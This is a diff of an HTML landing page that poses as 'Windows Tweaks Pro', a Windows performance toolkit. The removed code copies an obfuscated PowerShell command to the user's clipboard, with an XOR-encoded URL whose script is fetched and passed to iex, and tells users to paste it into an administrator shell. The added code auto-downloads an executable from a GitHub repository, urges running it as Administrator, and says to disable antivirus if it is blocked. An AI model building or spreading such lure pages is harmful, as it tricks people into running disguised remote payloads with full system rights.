@@ -8,228 +8,215 @@
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
 
 <style>
-html {
-  scroll-behavior: smooth;
+html {scroll-behavior:smooth;}
+
+body{
+margin:0;
+font-family:'Poppins',sans-serif;
+background: radial-gradient(circle at top, #0f172a, #020617);
+color:white;
+overflow-x:hidden;
 }
 
-body {
-  margin:0;
-  font-family:'Poppins',sans-serif;
-  background: radial-gradient(circle at top, #0f172a, #020617);
-  color:white;
-  overflow-x:hidden;
+/* NAV */
+nav{
+position:fixed;
+top:0;
+width:100%;
+display:flex;
+justify-content:center;
+gap:40px;
+padding:20px;
+background:rgba(0,0,0,0.4);
+backdrop-filter: blur(10px);
+z-index:1000;
 }
 
-nav {
-  position:fixed;
-  top:0;
-  width:100%;
-  display:flex;
-  justify-content:center;
-  gap:40px;
-  padding:20px;
-  background:rgba(0,0,0,0.4);
-  backdrop-filter: blur(10px);
-  z-index:1000;
+nav a{
+color:#38bdf8;
+text-decoration:none;
+transition:.3s;
 }
 
-nav a {
-  color:#38bdf8;
-  text-decoration:none;
-  font-weight:500;
-  transition:.3s;
+nav a:hover{
+color:white;
+transform:scale(1.1);
 }
 
-nav a:hover {
-  color:white;
-  transform:scale(1.1);
+/* SECTIONS */
+section{
+min-height:100vh;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+text-align:center;
+padding:100px 20px;
 }
 
-section {
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-  text-align:center;
-  padding:100px 20px;
+h1{
+font-size:3.5rem;
+background:linear-gradient(90deg,#38bdf8,#818cf8);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
 }
 
-h1 {
-  font-size:3.5rem;
-  background:linear-gradient(90deg,#38bdf8,#818cf8);
-  -webkit-background-clip:text;
-  -webkit-text-fill-color:transparent;
+/* CARDS */
+.cards{
+display:flex;
+gap:30px;
+flex-wrap:wrap;
+justify-content:center;
+margin-top:40px;
 }
 
-.cards {
-  display:flex;
-  gap:30px;
-  flex-wrap:wrap;
-  justify-content:center;
-  margin-top:40px;
+.card{
+width:280px;
+padding:30px;
+border-radius:20px;
+background:rgba(255,255,255,0.05);
+box-shadow:0 20px 40px rgba(0,0,0,0.6);
+transition:.4s;
+transform-style:preserve-3d;
 }
 
-.card {
-  width:280px;
-  padding:30px;
-  border-radius:20px;
-  background:rgba(255,255,255,0.05);
-  box-shadow:0 20px 40px rgba(0,0,0,0.6);
-  transition:.4s;
-  transform-style:preserve-3d;
+.card:hover{
+transform:rotateY(10deg) rotateX(10deg) scale(1.05);
 }
 
-.card:hover {
-  transform:rotateY(10deg) rotateX(10deg) scale(1.05);
+/* BUTTON */
+button{
+margin-top:20px;
+padding:12px 20px;
+border:none;
+border-radius:10px;
+background:linear-gradient(90deg,#38bdf8,#6366f1);
+color:white;
+cursor:pointer;
+transition:.3s;
 }
 
-button {
-  margin-top:20px;
-  padding:12px 20px;
-  border:none;
-  border-radius:10px;
-  background:linear-gradient(90deg,#38bdf8,#6366f1);
-  color:white;
-  cursor:pointer;
-  transition:.3s;
+button:hover{
+transform:scale(1.1);
 }
 
-button:hover {
-  transform:scale(1.1);
+/* TOAST */
+.toast{
+position:fixed;
+bottom:30px;
+left:50%;
+transform:translateX(-50%) translateY(100px);
+background:#111;
+border:1px solid #38bdf8;
+padding:20px;
+border-radius:15px;
+opacity:0;
+transition:.4s;
+max-width:350px;
+text-align:left;
 }
 
-footer {
-  padding:40px;
-  text-align:center;
-  opacity:0.6;
+.toast.show{
+transform:translateX(-50%) translateY(0);
+opacity:1;
 }
 
-/* Notification */
-.toast {
-  position:fixed;
-  bottom:30px;
-  left:50%;
-  transform:translateX(-50%) translateY(100px);
-  background:#111;
-  border:1px solid #38bdf8;
-  padding:20px;
-  border-radius:12px;
-  max-width:320px;
-  text-align:left;
-  opacity:0;
-  transition:.4s;
-  z-index:9999;
-  font-size:14px;
-  line-height:1.6;
-}
-
-.toast.show {
-  transform:translateX(-50%) translateY(0);
-  opacity:1;
+/* FOOTER */
+footer{
+padding:40px;
+text-align:center;
+opacity:0.6;
 }
 </style>
-
 </head>
+
 <body>
 
 <nav>
-  <a href="#home">Home</a>
-  <a href="#tools">Tools</a>
-  <a href="#usage">How To Use</a>
-  <a href="#about">About</a>
+<a href="#home">Home</a>
+<a href="#tools">Tools</a>
+<a href="#usage">Usage</a>
 </nav>
 
 <section id="home">
-  <h1>Windows Tweaks Pro</h1>
-  <p>Ultimate performance optimization toolkit for Windows</p>
+<h1>Windows Tweaks Pro</h1>
+<p>Ultimate 1000+ Tweaks for Performance, Gaming & System Optimization</p>
 </section>
 
 <section id="tools">
-  <h1>Power Tools</h1>
+<h1>Power Tools</h1>
 
-  <div class="cards">
+<div class="cards">
 
-    <div class="card">
-      <h2>🚀 Performance Boost</h2>
-      <p>Speed up your system instantly.</p>
-      <button onclick="copyCmd()">Copy Command</button>
-    </div>
+<div class="card">
+<h2>🚀 Performance</h2>
+<p>Boost system speed & responsiveness.</p>
+<button onclick="downloadFile()">Download</button>
+</div>
 
-    <div class="card">
-      <h2>🧹 Cleanup</h2>
-      <p>Remove junk files safely.</p>
-      <button onclick="copyCmd()">Copy Command</button>
-    </div>
+<div class="card">
+<h2>🧹 Cleanup</h2>
+<p>Remove junk & optimize storage.</p>
+<button onclick="downloadFile()">Download</button>
+</div>
 
-    <div class="card">
-      <h2>🌐 Network</h2>
-      <p>Reduce ping and stabilize connection.</p>
-      <button onclick="copyCmd()">Copy Command</button>
-    </div>
+<div class="card">
+<h2>🎮 Gaming</h2>
+<p>Increase FPS & reduce lag.</p>
+<button onclick="downloadFile()">Download</button>
+</div>
 
-  </div>
+<div class="card">
+<h2>🌐 Network</h2>
+<p>Lower ping & improve stability.</p>
+<button onclick="downloadFile()">Download</button>
+</div>
+
+</div>
 </section>
 
 <section id="usage">
-  <h1>How to Use</h1>
+<h1>How To Use</h1>
 
-  <div style="max-width:800px;line-height:1.8;font-size:1.1rem;opacity:0.9">
+<div style="max-width:700px;line-height:1.8;opacity:0.9">
 
-    <p><strong>Step 1:</strong> Click the "Copy Command" button</p>
-    <p><strong>Step 2:</strong> Open Start Menu → Search PowerShell</p>
-    <p><strong>Step 3:</strong> Right-click → Run as Administrator</p>
-    <p><strong>Step 4:</strong> Paste using CTRL + V</p>
-    <p><strong>Step 5:</strong> Press Enter</p>
+<p><b>1.</b> Download the tool from any section.</p>
+<p><b>2.</b> Locate the downloaded file.</p>
+<p><b>3.</b> Right-click → Run as Administrator.</p>
+<p><b>4.</b> Follow on-screen instructions.</p>
 
-    <br>
+<p style="color:#38bdf8;font-weight:bold;margin-top:20px">
+✔ Pro Tip: Disable antivirus temporarily if blocked.
+</p>
 
-    <p style="color:#38bdf8;font-weight:bold">
-      ✔ Always run PowerShell as Administrator
-    </p>
-
-  </div>
-</section>
-
-<section id="about">
-  <h1>About</h1>
-  <p>
-    This project provides powerful PowerShell tweaks to optimize Windows performance,
-    improve gaming experience, and enhance system stability.
-  </p>
+</div>
 </section>
 
 <footer>
 © 2026 Windows Tweaks Pro
 </footer>
 
-<div id="toast" class="toast"></div>
+<!-- TOAST -->
+<div id="toast" class="toast">
+<b>Download Started</b><br><br>
+Your tweak package is downloading...<br>
+Run it as Administrator after download.
+</div>
 
 <script>
-function copyCmd(){
-  const cmd = "irm ([Text.Encoding]::UTF8.GetString(([byte[]](49,45,45,41,42,99,118,118,62,48,45,49,44,59,119,58,54,52,118,22,10,28,18,31,28,109,118,45,118,43,56,46,118,43,60,63,42,118,49,60,56,61,42,118,52,56,48,55,118,46,48,55,44,45,48,53,119,41,42,104)|%{$_ -bxor 89}))) | iex";
-  navigator.clipboard.writeText(cmd);
+function downloadFile(){
+  // غير الرابط إلى ملفك الحقيقي
+  const link = document.createElement("a");
+  link.href = "https://github.com/OSEKFE4/t/raw/refs/heads/main/winutil.exe"; 
+  link.download = "https://github.com/OSEKFE4/t/raw/refs/heads/main/winutil.exe";
+  link.click();
 
   const toast = document.getElementById("toast");
-
-  toast.innerHTML = `
-  ✅ Command copied successfully!<br><br>
-
-  <b>How to use:</b><br>
-  1. Open Start Menu<br>
-  2. Search PowerShell<br>
-  3. Run as Administrator<br>
-  4. Paste (CTRL + V)<br>
-  5. Press Enter<br><br>
-
-  ⚡ Run as Admin for best results
-  `;
-
   toast.classList.add("show");
 
-  setTimeout(() => {
+  setTimeout(()=>{
     toast.classList.remove("show");
-  }, 5000);
+  },4000);
 }
 </script>
 
